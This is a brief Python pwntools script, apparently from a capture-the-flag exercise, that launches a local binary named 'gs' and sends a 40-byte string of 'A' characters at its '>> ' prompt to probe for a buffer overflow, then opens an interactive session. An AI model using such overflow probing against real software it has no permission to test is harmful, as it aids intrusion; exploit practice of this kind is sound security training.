from pwn import *

context.log_level = "debug"
p = process("./gs")

payload = b"A" * 40

p.sendlineafter(b">> ", payload)

p.interactive()
